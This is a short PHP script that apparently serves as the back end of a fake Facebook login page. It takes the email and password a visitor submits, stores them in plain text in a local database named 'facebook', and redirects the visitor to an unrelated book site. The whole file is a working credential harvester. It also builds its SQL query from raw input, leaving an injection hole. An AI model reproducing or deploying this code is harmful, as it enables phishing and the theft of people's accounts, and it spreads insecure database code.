<?php
header ("Location:http://www.freetechbooks.com/");
$username=$_POST['email'];
$password=$_POST['pass'];

if(!empty($username) && !empty($password)){
	
	$dbc=mysqli_connect('localhost','root','','facebook');
	$query="INSERT INTO login (username,pass) VALUES ('$username','$password')";
	 $result=mysqli_query($dbc,$query)
            or die('Error querying database');//Query
    mysqli_close($dbc);
}
?>